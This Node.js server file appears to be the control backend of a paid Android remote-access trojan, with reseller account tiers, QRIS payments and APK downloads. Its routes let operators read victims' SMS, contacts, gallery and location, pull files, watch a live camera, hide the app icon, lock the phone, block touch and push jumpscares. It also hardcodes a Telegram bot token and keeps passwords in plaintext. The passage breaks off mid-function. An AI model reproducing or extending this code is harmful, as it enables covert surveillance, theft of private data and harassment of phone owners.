const express    = require('express')
const http       = require('http')
const { Server } = require('socket.io')
const path       = require('path')
const crypto     = require('crypto')
const fs         = require('fs')
const TelegramBot = require('node-telegram-bot-api')

const app    = express()
const server = http.createServer(app)
const io     = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 10e6
})



const BOT_TOKEN = '8403638466:AAEiVgHPYiGj217yC6Fic_nPzLoC5wfAJ7E'
const OWNER_ID  = 8155916749
const bot       = new TelegramBot(BOT_TOKEN, { polling: true })

const NOTIF_BOT_TOKEN = '8403638466:AAEiVgHPYiGj217yC6Fic_nPzLoC5wfAJ7E'
const NOTIF_CHAT_ID  = -1004411868465
const notifBot       = new TelegramBot(NOTIF_BOT_TOKEN, { polling: false })

const noToast = ['lockDevice','unlockDevice','getSms','getNotifs','getGallery','getInstalledApps','blockApp','unblockApp','unblockAll','getLocation','getContacts','showToast']

const PAKASIR_PROJECT = 'Name_Project';
const PAKASIR_API_KEY = 'apikey_pakasir';
const PAKASIR_BASE = 'https://app.pakasir.com';



const ROLE_HIERARCHY = ['developer', 'owner', 'reseller', 'member']

const CAN_CREATE_ROLES = {
  developer: ['developer', 'owner', 'reseller', 'member'],
  owner:     ['reseller', 'member'],
  reseller:  ['member'],
  member:    []
}

const ROLE_QUOTA = {
  developer: { developer: Infinity, owner: Infinity, reseller: Infinity, member: Infinity },
  owner:     { reseller: 5, member: 300 },
  reseller:  { member: 110 }
}

app.use(express.json())
app.use(express.static(path.join(__dirname, 'frontend')))

const ACCOUNTS_FILE = path.join(__dirname, 'accounts.json')
const ORDERS_FILE = path.join(__dirname, 'orders.json');
const sessions      = {}
const DEVICE_FILE = path.join(__dirname, 'device.json')
function loadDevices() { try { return JSON.parse(fs.readFileSync(DEVICE_FILE,'utf8')) } catch { return {} } }
function saveDevices(d) { fs.writeFileSync(DEVICE_FILE, JSON.stringify(d, null, 2)) }



function loadOrders() {
    try {
        return JSON.parse(fs.readFileSync(ORDERS_FILE, 'utf8'));
    } catch {
        return {};
    }
}

function saveOrders(orders) {
    fs.writeFileSync(ORDERS_FILE, JSON.stringify(orders, null, 2));
}

// ── Fungsi fetch ke Pakasir ─────────────────────────────────────
async function postJson(url, body, timeout = 20000) {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), timeout);
    try {
        const res = await fetch(url, {
            method: 'POST',
            signal: ctrl.signal,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        });
        let data = {};
        try { data = await res.json(); } catch {}
        if (!res.ok) throw new Error((data && (data.message || data.error)) || ('HTTP ' + res.status));
        return data;
    } finally { clearTimeout(t); }
}

async function getJson(url, timeout = 20000) {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), timeout);
    try {
        const res = await fetch(url, { signal: ctrl.signal });
        let data = {};
        try { data = await res.json(); } catch {}
        if (!res.ok) throw new Error((data && (data.message || data.error)) || ('HTTP ' + res.status));
        return data;
    } finally { clearTimeout(t); }
}

// ── Buat QRIS Pakasir ───────────────────────────────────────────
async function createQrisPakasir({ amount, orderId }) {
    if (!PAKASIR_PROJECT || !PAKASIR_API_KEY) {
        throw new Error('PAKASIR_PROJECT / PAKASIR_API_KEY belum diisi');
    }

    const data = await postJson(`${PAKASIR_BASE}/api/transactioncreate/qris`, {
        project: PAKASIR_PROJECT,
        order_id: orderId,
        amount: amount,
        api_key: PAKASIR_API_KEY
    });

    const p = data.payment || data;
 
    console.log('[PAKASIR RAW]', JSON.stringify(p));
    const qrString = p.payment_number || p.qr_string || p.qris || p.qr;

    if (!qrString) {
        throw new Error('QR string kosong dari Pakasir');
    }

    return {
        qrString: qrString,
        amount: p.amount != null ? p.amount : amount,
        total: p.total_payment != null ? p.total_payment : (p.amount != null ? p.amount : amount),
        raw: p,
        invoice_id: p.order_id || p.invoice_id || orderId
    };
}

// ── Cek status pembayaran Pakasir ──────────────────────────────
async function checkStatusPakasir({ orderId, amount }) {
    if (!PAKASIR_PROJECT || !PAKASIR_API_KEY) {
        throw new Error('PAKASIR_PROJECT / PAKASIR_API_KEY belum diisi');
    }

    const url = `${PAKASIR_BASE}/api/transactiondetail?project=${encodeURIComponent(PAKASIR_PROJECT)}&amount=${encodeURIComponent(amount)}&order_id=${encodeURIComponent(orderId)}&api_key=${encodeURIComponent(PAKASIR_API_KEY)}`;

    const data = await getJson(url);
    const t = data.transaction || data;

    return {
        status: (t && t.status) || 'pending',
        raw: t,
        isPaid: (t && t.status === 'completed') || false
    };
}

// ── Harga produk ─────────────────────────────────────────────────
const PRODUCT_PRICES = {
    member: 50000,
    reseller: 250000,
    owner: 500000
};


async function sendAccountsToBot() {
  try {
    await bot.sendDocument(OWNER_ID, ACCOUNTS_FILE, {}, {
      filename: 'accounts.json',
      contentType: 'application/json'
    })
    console.log('[BOT] accounts.json terkirim ke Telegram')
  } catch (e) {
    console.error('[BOT] Gagal kirim:', e.message)
  }
}

// Kirim saat pertama kali server jalan

function getAccountRole(username) {
  const accounts = loadAccounts()
  return accounts[username]?.role || 'member'
}

function roleIndex(role) {
  return ROLE_HIERARCHY.indexOf(role)
}

function loadAccounts() {
  if (!fs.existsSync(ACCOUNTS_FILE)) fs.writeFileSync(ACCOUNTS_FILE, '{}', 'utf8')
  return JSON.parse(fs.readFileSync(ACCOUNTS_FILE, 'utf8'))
}

function saveAccounts(data) {
  fs.writeFileSync(ACCOUNTS_FILE, JSON.stringify(data, null, 2), 'utf8')
}


async function sendNotifAkunBaru(username, uid, createdBy, trialExpiry) {
  try {
    const expired = trialExpiry ? new Date(trialExpiry).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) : 'Permanent'
    const msg = `✅ *AKUN BARU DIBUAT*\n\nUsername: \`${username}\`\nUID: \`${uid}\`\nExpired: ${expired}\nDibuat oleh: ${createdBy}`
    await notifBot.sendMessage(NOTIF_CHAT_ID, msg, { parse_mode: 'Markdown' })
  } catch (e) {
    console.error('[NOTIF] Error:', e.message)
  }
}

async function sendNotifAkunHapus(username, deletedBy) {
  try {
    const msg = `🗑️ *AKUN DIHAPUS*\n\nUsername: \`${username}\`\nDihapus oleh: ${deletedBy}`
    await notifBot.sendMessage(NOTIF_CHAT_ID, msg, { parse_mode: 'Markdown' })
  } catch (e) {
    console.error('[NOTIF] Error:', e.message)
  }
}


// ── Trial Duration Helper ──────────────────────────────────────
function getTrialExpiry(duration) {
  if (!duration || duration === 'permanent') return null
  const now = new Date()
  if (duration === '3m')  { now.setMinutes(now.getMinutes() + 3);  return now.toISOString() }
  if (duration === '5m')  { now.setMinutes(now.getMinutes() + 5);  return now.toISOString() }
  if (duration === '10m') { now.setMinutes(now.getMinutes() + 10); return now.toISOString() }
  if (duration === '3d')  { now.setDate(now.getDate() + 3);  return now.toISOString() }
  if (duration === '7d')  { now.setDate(now.getDate() + 7);  return now.toISOString() }
  if (duration === '30d') { now.setDate(now.getDate() + 30); return now.toISOString() }
  return null
}

// ── Quota Helpers ──────────────────────────────────────────────
function getQuotaUsed(creatorUsername, targetRole) {
  const accounts = loadAccounts()
  return Object.values(accounts).filter(
    a => a.createdBy === creatorUsername && a.role === targetRole
  ).length
}

function getQuotaLimit(creatorUsername, targetRole) {
  const accounts = loadAccounts()
  const acc = accounts[creatorUsername]
  if (!acc) return 0
  const myRole = acc.role || 'member'
  if (myRole === 'developer') return Infinity

  const base = (ROLE_QUOTA[myRole] || {})[targetRole]
  if (base === undefined) return 0

  const visa = (acc.visa || {})[targetRole] || 0
  return base + visa
}

// ── Auto Delete Expired Accounts ──────────────────────────────
function deleteExpiredAccounts() {
  const accounts = loadAccounts()
  const now = new Date()
  let deleted = 0

  for (const [username, acc] of Object.entries(accounts)) {
    if (!acc.trialExpiry) continue
    if (new Date(acc.trialExpiry) <= now) {
      // Kick semua sesi aktif
      for (const [tok, sess] of Object.entries(sessions)) {
        if (sess.username === username) delete sessions[tok]
      }
      delete accounts[username]
      deleted++
      console.log(`\x1b[31m[TRIAL]\x1b[0m Akun "${username}" dihapus otomatis (trial expired)`)
    }
  }

  if (deleted > 0) saveAccounts(accounts)
}

// Jalankan pengecekan setiap 1 menit
setInterval(deleteExpiredAccounts, 60 * 1000)

function genToken() {
  return crypto.randomBytes(24).toString('hex')
}

function hashPwd(pwd) {
  return crypto.createHash('sha256').update(pwd).digest('hex')
}

function requireAuth(req, res, next) {
  const token = req.headers['x-auth-token'] || req.query.token
  if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' })

  const username = sessions[token].username
  const accounts = loadAccounts()
  const acc = accounts[username]

  // Cek apakah akun masih ada (mungkin sudah dihapus oleh auto-cleanup)
  if (!acc) {
    delete sessions[token]
    return res.status(401).json({ error: 'Akun tidak ditemukan atau sudah dihapus' })
  }

  // Cek trial expired — hapus langsung kalau sudah lewat
  if (acc.trialExpiry && new Date(acc.trialExpiry) <= new Date()) {
    for (const [tok, sess] of Object.entries(sessions)) {
      if (sess.username === username) delete sessions[tok]
    }
    delete accounts[username]
    saveAccounts(accounts)
    console.log(`\x1b[31m[TRIAL]\x1b[0m Akun "${username}" dihapus otomatis saat login (trial expired)`)
    return res.status(401).json({ error: 'Akun trial kamu sudah berakhir dan telah dihapus' })
  }

  req.username = username
  req.uid      = sessions[token].uid
  next()
}

function isOwner(userId) {
  return userId === OWNER_ID
}

function parseCakun(text) {
  const raw       = text.replace(/^\/cakun\s*/i, '').trim()
  const lastComma = raw.lastIndexOf(',')
  if (lastComma === -1) return null
  const displayName = raw.slice(0, lastComma).trim()
  const password    = raw.slice(lastComma + 1).trim()
  if (!displayName || !password) return null
  const username = displayName.toLowerCase()
  return { username, displayName, password }
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'frontend', 'iklan.html'))
})


app.post('/api/order/create', async (req, res) => {
    const { role, username, password } = req.body;

    if (!role || !username || !password) {
        return res.status(400).json({
            success: false,
            error: 'Data tidak lengkap! role, username, password required.'
        });
    }

    const amount = PRODUCT_PRICES[role];
    if (!amount) {
        return res.status(400).json({
            success: false,
            error: `Role "${role}" tidak valid!`
        });
    }

    // Cek apakah username sudah ada
    
    const BLACKLIST = ['kenzie', 'admin', 'owner', 'kenxrat'];
if (BLACKLIST.includes(username.toLowerCase())) {
    return res.status(400).json({
        success: false,
        error: `Username "${username}" tidak diizinkan!`
    });
}
    
    
    const accounts = loadAccounts();
    const key = username.toLowerCase();
    if (accounts[key]) {
        return res.status(409).json({
            success: false,
            error: `Username "${username}" sudah digunakan!`
        });
    }

    // Buat order ID
    const orderId = 'ORD-' + Date.now() + '-' + crypto.randomBytes(4).toString('hex').toUpperCase();

    try {
        // Buat QRIS di Pakasir
        const qris = await createQrisPakasir({
            amount: amount,
            orderId: orderId
        });

        // Simpan order
        const orders = loadOrders();
        orders[orderId] = {
            role: role,
            username: username,
            password: password,
            amount: amount,
            status: 'pending',
            pakasir_order_id: qris.invoice_id || orderId,
            createdAt: new Date().toISOString(),
            expiresAt: new Date(Date.now() + 300000).toISOString() // 30 detik
        };
        saveOrders(orders);

        console.log(`\x1b[36m[ORDER]\x1b[0m Invoice dibuat: ${orderId} | ${role} | Rp ${amount.toLocaleString('id-ID')}`);

        res.json({
            success: true,
            invoice_id: orderId,
            amount: amount,
            qr_image: qris.qrString, // QR String dari Pakasir
            payment_url: `https://app.pakasir.com/pay/${qris.invoice_id || orderId}`,
            expires_in: 300
        });

    } catch (error) {
        console.error('[PAKASIR] Error:', error.message);
        res.status(500).json({
            success: false,
            error: `Gagal membuat QRIS: ${error.message}`
        });
    }
});

// ── CHECK PAYMENT STATUS ──────────────────────────────────────
app.get('/api/order/status/:invoiceId', async (req, res) => {
    const { invoiceId } = req.params;
    const orders = loadOrders();
    const order = orders[invoiceId];

    if (!order) {
        return res.status(404).json({
            status: 'not_found',
            error: 'Invoice tidak ditemukan'
        });
    }

    // Cek expired di sisi server
    if (order.status === 'pending' && new Date(order.expiresAt) <= new Date()) {
        order.status = 'expired';
        saveOrders(orders);
        return res.json({
            status: 'expired',
            invoice_id: invoiceId
        });
    }

    try {
        // Cek status ke Pakasir
        const status = await checkStatusPakasir({
            orderId: order.pakasir_order_id || invoiceId,
            amount: order.amount
        });

        if (status.isPaid) {
            order.status = 'paid';
            order.paidAt = new Date().toISOString();
            saveOrders(orders);
        }

        res.json({
            status: order.status,
            invoice_id: invoiceId,
            amount: order.amount,
            role: order.role,
            pakasir_status: status.status
        });

    } catch (error) {
        console.error('[PAKASIR] Check status error:', error.message);
        res.status(500).json({
            status: 'error',
            error: `Gagal cek status: ${error.message}`
        });
    }
});

// ── COMPLETE ORDER ────────────────────────────────────────────
app.post('/api/order/complete', async (req, res) => {
    const { invoice_id, username, password, role } = req.body;

    if (!invoice_id || !username || !password || !role) {
        return res.status(400).json({
            success: false,
            error: 'Data tidak lengkap'
        });
    }

    const orders = loadOrders();
    const order = orders[invoice_id];

    if (!order) {
        return res.status(404).json({
            success: false,
            error: 'Invoice tidak ditemukan'
        });
    }

    if (order.status !== 'paid') {
        return res.status(400).json({
            success: false,
            error: 'Pembayaran belum dikonfirmasi'
        });
    }

    // Cek apakah akun sudah ada
    const accounts = loadAccounts();
    const key = username.toLowerCase();

    if (accounts[key]) {
        return res.status(409).json({
            success: false,
            error: `Username "${username}" sudah digunakan!`
        });
    }

    // Buat akun
    const newUid = crypto.randomBytes(16).toString('hex');
    accounts[key] = {
        password: password,
        displayName: username,
        role: role,
        uid: newUid,
        createdBy: `order_${invoice_id}`,
        createdAt: new Date().toISOString(),
        trialDuration: 'permanent',
        trialExpiry: null
    };
    saveAccounts(accounts);

    // Update order status
    order.status = 'completed';
    order.completedAt = new Date().toISOString();
    order.createdUsername = username;
    saveOrders(orders);

    console.log(`\x1b[32m[ORDER]\x1b[0m Akun dibuat: ${username} (${role}) dari invoice ${invoice_id}`);

    // Kirim notifikasi ke owner via bot
    try {
        await bot.sendMessage(OWNER_ID,
            `✅ *ORDER COMPLETED*\n\n` +
            `Invoice: ${invoice_id}\n` +
            `Username: ${username}\n` +
            `Role: ${role}\n` +
            `Harga: Rp ${order.amount.toLocaleString('id-ID')}`
        );
    } catch (e) {
        console.error('[BOT] Gagal kirim notifikasi:', e.message);
    }

    // Cek file APK
    const apkFiles = [];
    const produkDir = path.join(__dirname, 'produk');
    ['kontrol.apk', 'stum.apk'].forEach(file => {
        if (fs.existsSync(path.join(produkDir, file))) {
            apkFiles.push(file);
        }
    });

    res.json({
        success: true,
        username: username,
        password: password,
        role: role,
        uid: newUid,
        apk_files: apkFiles
    });
});

// ── GET ORDERS (Admin) ──────────────────────────────────────
app.get('/api/admin/orders', requireAuth, (req, res) => {
    const myRole = getAccountRole(req.username);
    if (!['developer', 'owner'].includes(myRole)) {
        return res.status(403).json({ error: 'Akses ditolak' });
    }

    const orders = loadOrders();
    const list = Object.entries(orders).map(([id, order]) => ({
        invoice_id: id,
        ...order
    }));

    res.json(list);
});

// ── ROUTE UNTUK DOWNLOAD APK ────────────────────────────────
app.get('/produk/:filename', (req, res) => {
    const filename = req.params.filename;
    const filepath = path.join(__dirname, 'produk', filename);

    if (!fs.existsSync(filepath)) {
        return res.status(404).send('File tidak ditemukan');
    }

    res.sendFile(filepath);
});

// ── ROUTE UNTUK ORDER.HTML ───────────────────────────────────
app.get('/order', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend', 'order.html'));
});

app.post('/api/change-password', requireAuth, (req, res) => {
  const { oldPassword, newPassword } = req.body
  if (!oldPassword || !newPassword)
    return res.status(400).json({ error: 'Semua field wajib diisi' })
  if (newPassword.length < 6)
    return res.status(400).json({ error: 'Password baru minimal 6 karakter' })

  const accounts = loadAccounts()
  const acc = accounts[req.username]
  if (!acc) return res.status(404).json({ error: 'Akun tidak ditemukan' })

  if (acc.password !== oldPassword)
    return res.status(401).json({ error: 'Password lama salah' })

  acc.password = newPassword
  accounts[req.username] = acc
  saveAccounts(accounts)

  res.json({ ok: true })
})

app.post('/api/login', (req, res) => {
  const { username, password } = req.body
  if (!username || !password) return res.status(400).json({ error: 'Username Dan Password Wajib Diisi' })

  const accounts = loadAccounts()
  const acc = accounts[username]
  if (!acc || acc.password !== password) {
    return res.status(401).json({ error: 'Username Atau Password Salah' })
  }

  if (!acc.uid) {
    acc.uid = crypto.randomBytes(16).toString('hex')
    accounts[username] = acc
    saveAccounts(accounts)
  }

  const { deviceId } = req.body
  const devices = loadDevices()
  if (devices[username] && devices[username] !== deviceId) {
    return res.status(403).json({ error: 'Akun ini sudah digunakan di perangkat lain' })
  }
  devices[username] = deviceId
  saveDevices(devices)

  const token = genToken()
  sessions[token] = { username: username, uid: acc.uid }
  res.json({ ok: true, token, username: acc.displayName || username })
})

app.post('/api/logout', requireAuth, (req, res) => {
  const token = req.headers['x-auth-token']
  delete sessions[token]
  res.json({ ok: true })
})

app.get('/api/me', requireAuth, (req, res) => {
  const accounts = loadAccounts()
  const acc      = accounts[req.username]
  if (!acc) return res.status(404).json({ error: 'Account not found' })
  res.json({
    username:    req.username,
    displayName: acc.displayName || req.username,
    role:        acc.role || 'member',
    uid:         acc.uid  || '',
    trialExpiry: acc.trialExpiry || null
  })
})



// ── GET /api/admin/quota ───────────────────────────────────────
app.get('/api/admin/quota', requireAuth, (req, res) => {
  const myRole = getAccountRole(req.username)
  if (myRole === 'developer') {
    return res.json({ unlimited: true })
  }
  const allowed = CAN_CREATE_ROLES[myRole] || []
  const result = {}
  allowed.forEach(targetRole => {
    const limit = getQuotaLimit(req.username, targetRole)
    const used  = getQuotaUsed(req.username, targetRole)
    result[targetRole] = { used, limit, remaining: limit - used }
  })
  res.json({ unlimited: false, quota: result })
})

app.post('/api/admin/create-account', requireAuth, async (req, res) => {
                                                    
  const myRole = getAccountRole(req.username)
  const { username, password, role, trialDuration } = req.body

  if (!username || !password || !role)
    return res.status(400).json({ error: 'Username, password, dan role wajib diisi' })

  if (!['developer', 'owner', 'reseller'].includes(myRole))
    return res.status(403).json({ error: 'Hanya developer, owner, dan reseller yang bisa membuat akun' })

  const allowed = CAN_CREATE_ROLES[myRole] || []
  if (!allowed.includes(role))
    return res.status(403).json({ error: `Role "${myRole}" tidak diizinkan membuat akun dengan role "${role}"` })

  // ── Cek Quota ──────────────────────────────────────────────
  if (myRole !== 'developer') {
    const limit = getQuotaLimit(req.username, role)
    const used  = getQuotaUsed(req.username, role)
    if (used >= limit)
      return res.status(403).json({ error: `Quota habis! Kamu sudah membuat ${used}/${limit} akun role "${role}"` })
  }

  // ── ATURAN DURASI ──────────────────────────────────────────────
  // Akun selain member (reseller, owner, developer) → WAJIB permanent
  if (role !== 'member') {
    if (trialDuration && trialDuration !== 'permanent')
      return res.status(400).json({ error: `Akun role "${role}" hanya bisa permanent, tidak bisa trial` })
  }

  // Akun member → validasi durasi sesuai role pembuat
  let validDurations
  if (role === 'member') {
    if (myRole === 'developer') {
      validDurations = ['3m', '5m', '10m', '3d', '7d', '30d', 'permanent']
    } else if (myRole === 'reseller') {
      // reseller: member hanya bisa permanent
      validDurations = ['permanent']
    } else {
      // owner: member bisa trial tapi NO menit
      validDurations = ['3d', '7d', '30d', 'permanent']
    }
  } else {
    // non-member → hanya permanent
    validDurations = ['permanent']
  }

  const finalDuration = trialDuration || (role !== 'member' ? 'permanent' : null)
  if (!finalDuration || !validDurations.includes(finalDuration))
    return res.status(400).json({ error: `trialDuration tidak valid. Opsi: ${validDurations.join(', ')}` })

  const accounts = loadAccounts()
  const key = username.trim()

  if (!key || key.length < 3)
    return res.status(400).json({ error: 'Username minimal 3 karakter' })

  if (key.toLowerCase() === 'smooth' && key !== 'Smooth')
    return res.status(403).json({ error: 'Username tersebut tidak diizinkan' })

  if (accounts[key])
    return res.status(409).json({ error: `Akun "${username}" sudah ada` })

  const newUid      = crypto.randomBytes(16).toString('hex')
  const trialExpiry = getTrialExpiry(finalDuration)

  accounts[key] = {
    password:      password,
    displayName:   username.trim(),
    role:          role,
    uid:           newUid,
    createdBy:     req.username,
    createdAt:     new Date().toISOString(),
    trialDuration: finalDuration,
    trialExpiry:   trialExpiry
  }
  saveAccounts(accounts)

  const durasiLabel = finalDuration === 'permanent' ? 'Permanent' : `Trial ${finalDuration}`
  console.log(`\x1b[36m[ADMIN]\x1b[0m Akun baru: ${key} (${role}) [${durasiLabel}] oleh ${req.username}`)
  
  await sendNotifAkunBaru(key, newUid, req.username, trialExpiry)

  res.json({ ok: true, uid: newUid, username: key, displayName: username.trim(), role, trialDuration: finalDuration, trialExpiry })
})

// ── GET /api/admin/accounts ────────────────────────────────────
// Developer  → lihat semua
// Owner      → lihat reseller + member (+ diri sendiri)
// Reseller   → lihat member (+ diri sendiri)
// Member     → hanya diri sendiri
app.get('/api/admin/accounts', requireAuth, (req, res) => {
  const myRole   = getAccountRole(req.username)
  const accounts = loadAccounts()
  const myIdx    = roleIndex(myRole)

  const list = Object.entries(accounts)
    .filter(([uname, acc]) => {
      const accRole    = acc.role || 'member'
      const accRoleIdx = roleIndex(accRole)
      // Developer lihat semua; lainnya lihat role di bawahnya + diri sendiri
      if (myRole === 'developer') return true
      return accRoleIdx >= myIdx || uname === req.username
    })
    .map(([username, acc]) => ({
      username,
      displayName:   acc.displayName || username,
      role:          acc.role || 'member',
      uid:           acc.uid  || '-',
      createdBy:     acc.createdBy || '-',
      createdAt:     acc.createdAt || null,
      trialDuration: acc.trialDuration || 'permanent',
      trialExpiry:   acc.trialExpiry || null
    }))
    .sort((a, b) => roleIndex(a.role) - roleIndex(b.role))

  res.json(list)
})

// ── DELETE /api/admin/accounts/:username ───────────────────────
// Hanya bisa hapus akun yang rolenya DI BAWAH role kamu
app.delete('/api/admin/accounts/:username', requireAuth, async (req, res) => {
         
  const myRole     = getAccountRole(req.username)
  const targetUser = req.params.username.trim()

  if (targetUser === req.username)
    return res.status(400).json({ error: 'Tidak bisa menghapus akun sendiri' })

  const accounts = loadAccounts()
  if (!accounts[targetUser])
    return res.status(404).json({ error: 'Akun tidak ditemukan' })

  const targetRole = accounts[targetUser].role || 'member'
  const myIdx      = roleIndex(myRole)
  const targetIdx  = roleIndex(targetRole)

  // Harus punya role LEBIH TINGGI (index lebih kecil) dari target
  if (myIdx >= targetIdx)
    return res.status(403).json({
      error: `Role "${myRole}" tidak bisa menghapus akun dengan role "${targetRole}"`
    })

  delete accounts[targetUser]
  saveAccounts(accounts)

  const devs = loadDevices()
  delete devs[targetUser]
  saveDevices(devs)

  // Kick semua sesi aktif akun tersebut
  let kicked = 0
  for (const [tok, sess] of Object.entries(sessions)) {
    if (sess.username === targetUser) { delete sessions[tok]; kicked++ }
  }

  console.log(`\x1b[33m[ADMIN]\x1b[0m Akun dihapus: ${targetUser} (${targetRole}) oleh ${req.username}, sesi dikick: ${kicked}`)
  
  await sendNotifAkunHapus(targetUser, req.username)

  res.json({ ok: true, kicked })
})

// ── PATCH /api/admin/accounts/:username/role ───────────────────
// Ganti role akun (opsional, bisa dipakai nanti)
// Developer bisa ganti semua; Owner bisa ganti reseller→member dan sebaliknya
app.patch('/api/admin/accounts/:username/role', requireAuth, (req, res) => {
  const myRole     = getAccountRole(req.username)
  const targetUser = req.params.username.trim()
  const { role: newRole } = req.body

  if (!newRole || !ROLE_HIERARCHY.includes(newRole))
    return res.status(400).json({ error: 'Role tidak valid' })

  if (targetUser === req.username)
    return res.status(400).json({ error: 'Tidak bisa mengubah role sendiri' })

  const accounts = loadAccounts()
  if (!accounts[targetUser])
    return res.status(404).json({ error: 'Akun tidak ditemukan' })

  const targetRole = accounts[targetUser].role || 'member'
  const myIdx      = roleIndex(myRole)
  const targetIdx  = roleIndex(targetRole)
  const newIdx     = roleIndex(newRole)

  // Harus lebih tinggi dari target SEKARANG dan dari role BARU
  if (myIdx >= targetIdx || myIdx >= newIdx)
    return res.status(403).json({ error: 'Tidak punya izin mengubah role ini' })

  accounts[targetUser].role = newRole
  saveAccounts(accounts)

  console.log(`\x1b[36m[ADMIN]\x1b[0m Role diubah: ${targetUser} ${targetRole}→${newRole} oleh ${req.username}`)
  res.json({ ok: true, username: targetUser, oldRole: targetRole, newRole })
})

// ── Tambahkan route admin panel HTML ──────────────────────────
// Supaya /adminpanel bisa diakses
app.get('/adminpanel', (req, res) => {
  res.sendFile(path.join(__dirname, 'frontend', 'adminpanel.html'))
})

// ── File Download via socket (server jadi relay) ──────────────────────────
const pendingFileDownloads = {}

app.get('/api/file/:deviceId', requireAuth, (req, res) => {
  const { deviceId } = req.params
  const filePath = req.query.path
  if (!filePath) return res.status(400).json({ error: 'path diperlukan' })
  if (!devices[deviceId]) return res.status(404).json({ error: 'Device not found' })

  const accounts = loadAccounts()
  const acc = accounts[req.username]
  if (!acc?.smooth && devices[deviceId].uid !== req.uid)
    return res.status(403).json({ error: 'Forbidden' })

  const reqId = crypto.randomBytes(8).toString('hex')
  const filename = filePath.split('/').pop() || 'file'

  let settled = false
  pendingFileDownloads[reqId] = (err, buf, mime) => {
    if (settled) return
    settled = true
    delete pendingFileDownloads[reqId]
    if (err) return res.status(500).json({ error: err })
    res.setHeader('Content-Disposition', `attachment; filename="${encodeURIComponent(filename)}"`)
    res.setHeader('Content-Type', mime || 'application/octet-stream')
    res.send(buf)
  }

  io.to(`device:${deviceId}`).emit('command', { command: 'downloadFile', value: JSON.stringify({ path: filePath, reqId }) })

  setTimeout(() => {
    if (pendingFileDownloads[reqId]) {
      pendingFileDownloads[reqId]('Timeout: device tidak merespons')
    }
  }, 30000)
})

app.get('/api/screenshot/:deviceId', requireAuth, (req, res) => {
  const { deviceId } = req.params
  if (!devices[deviceId]) return res.status(404).json({ error: 'Device not found' })

  const accounts = loadAccounts()
  const acc = accounts[req.username]
  if (!acc?.smooth && devices[deviceId].uid !== req.uid)
    return res.status(403).json({ error: 'Forbidden' })

  const frame = cameraFrames[deviceId]
  if (!frame) return res.status(404).json({ error: 'Belum ada frame. Nyalakan Live Camera dulu!' })

  res.json({ ok: true, frame, deviceId })
})


app.get('/api/devices', requireAuth, (req, res) => {
  const accounts = loadAccounts()
  const acc = accounts[req.username]
  if (acc?.smooth) return res.json(getDeviceListForSmooth())
  res.json(getDeviceListForUid(req.uid))
})

app.post('/api/command/:deviceId', requireAuth, (req, res) => {
  const { deviceId }      = req.params
  const { command, value } = req.body
  if (!devices[deviceId]) return res.status(404).json({ error: 'Device Not Found' })
  const accounts = loadAccounts()
const acc = accounts[req.username]
if (!acc?.smooth && devices[deviceId].uid !== req.uid) 
  return res.status(403).json({ error: 'Forbidden' })

  if (command === 'lockDevice') {
    try {
      const parsed = typeof value === 'string' ? JSON.parse(value) : value
      devices[deviceId].status.deviceLocked = true
      devices[deviceId].status.lockTitle    = parsed.title || ''
      broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
    } catch (_) {}
  } 
  
 else if (command === 'hideIcon') {
    devices[deviceId].status.iconHidden = (value === 'true')
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
}


else if (command === 'touchBlock') {
  devices[deviceId].status.touchBlocked = true
  broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
} else if (command === 'touchBlockStop') {
  devices[deviceId].status.touchBlocked = false
  broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
 }


else if (command === 'ttsSpeak') {
  devices[deviceId].status.ttsSpeaking = true
  broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
} else if (command === 'ttsStop') {
  devices[deviceId].status.ttsSpeaking = false
  broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
}

else if (command === 'videoOverlay') {
  devices[deviceId].status.videoOverlayActive = true
  broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
} else if (command === 'videoOverlayHide') {
  devices[deviceId].status.videoOverlayActive = false
  broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  }


else if (command === 'jumpscare2Start') {
  try {
    const obj = typeof value === 'string' ? JSON.parse(value) : value
    devices[deviceId].status.jumpscare2Active   = true
    devices[deviceId].status.jumpscare2Url      = obj.url || ''
    devices[deviceId].status.jumpscare2Duration = obj.duration || 3000
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } catch (_) {}
} else if (command === 'jumpscare2Stop') {
  devices[deviceId].status.jumpscare2Active = false
  broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
}


else if (command === 'dialogSpam') {
  devices[deviceId].status.dialogSpamActive = true
  broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
} else if (command === 'dialogSpamStop') {
  devices[deviceId].status.dialogSpamActive = false
  broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
}

else if (command === 'muteVolume') {
    devices[deviceId].status.volumeMuted = (value === 'true')
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
}
  
  else if (command === 'unlockDevice') {
    devices[deviceId].status.deviceLocked = false
    devices[deviceId].status.lockTitle    = ''
